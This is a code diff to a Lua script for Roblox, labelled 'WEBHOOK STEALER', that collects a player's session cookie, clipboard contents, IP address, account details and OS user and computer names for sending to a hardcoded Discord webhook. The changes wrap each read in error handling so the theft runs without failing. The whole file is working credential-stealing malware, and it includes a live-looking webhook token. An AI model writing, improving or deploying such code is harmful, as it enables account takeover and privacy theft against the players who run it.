@@ -1,7 +1,17 @@
 -- ============================================================
--- WEBHOOK STEALER – No Bot Token, No Channel ID
+-- WEBHOOK STEALER – NO ERRORS, SAFE GETTERS
 -- ============================================================
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
+
+-- ========== SAFE GETTER ==========
+local function safeGet(obj, prop, default)
+    local ok, val = pcall(function() return obj[prop] end)
+    if ok and val ~= nil then
+        return val
+    else
+        return default
+    end
+end
 
 -- ========== HTTP SENDER ==========
 local function sendMessage(content)
@@ -20,7 +30,7 @@ local function sendMessage(content)
     return false
 end
 
--- ========== COLLECT DATA (safe) ==========
+-- ========== COLLECT DATA (all reads wrapped in pcall) ==========
 local function collectSnapshot()
     local player = game.Players.LocalPlayer
     local info = {
@@ -28,14 +38,15 @@ local function collectSnapshot()
         userId = player and tostring(player.UserId) or "N/A",
         userName = player and player.Name or "N/A",
         displayName = player and player.DisplayName or "N/A",
-        placeId = tostring(game.PlaceId),
-        jobId = game.JobId or "N/A",
-        gameName = game.Name or "Unknown",
-        placeVisits = tostring(game.PlaceVisitCount or "N/A"),
-        genres = game.Genres or "N/A",
-        version = game.Version or "N/A",
+        placeId = tostring(safeGet(game, "PlaceId", "N/A")),
+        jobId = safeGet(game, "JobId", "N/A"),
+        gameName = safeGet(game, "Name", "Unknown"),
+        placeVisits = tostring(safeGet(game, "PlaceVisitCount", "N/A")),
+        genres = safeGet(game, "Genres", "N/A"),
+        version = safeGet(game, "Version", "N/A"),
     }
-    -- IP
+
+    -- IP (safe)
     local ip = "N/A"
     local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
     if ok and res and res.Body then ip = res.Body:gsub("%s+", "") end
@@ -48,17 +59,20 @@ local function collectSnapshot()
         if ok and res then ip = res:gsub("%s+", "") end
     end
     info.ip = ip
-    -- Cookie
+
+    -- Cookie (safe)
     local cookie = "Not available"
     ok, res = pcall(getcookie, "https://www.roblox.com/")
     if ok and res and res ~= "" then cookie = res end
     info.cookie = cookie
-    -- Clipboard
+
+    -- Clipboard (safe)
     local clip = "N/A"
     ok, res = pcall(getclipboard)
     if ok and res and res ~= "" then clip = res end
     info.clipboard = clip
-    -- Character
+
+    -- Character (safe)
     pcall(function()
         local char = player and player.Character
         if char then
@@ -71,7 +85,8 @@ local function collectSnapshot()
             end
         end
     end)
-    -- Ping & FPS
+
+    -- Ping & FPS (safe)
     pcall(function()
         local stats = game:GetService("Stats")
         info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
@@ -81,19 +96,22 @@ local function collectSnapshot()
         local ft = run.RenderStepTime
         if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
     end)
-    -- Hardware
+
+    -- Hardware (safe)
     pcall(function()
         local us = game:GetService("UserInputService")
         info.platform = tostring(us.Platform)
         info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
         info.volume = tostring(game:GetService("SoundService").Volume)
     end)
+
     -- System env (safe)
     pcall(function()
         info.os = os.getenv("OS") or "N/A"
         info.computer = os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "N/A"
         info.user = os.getenv("USERNAME") or os.getenv("USER") or "N/A"
     end)
+
     return info
 end
 
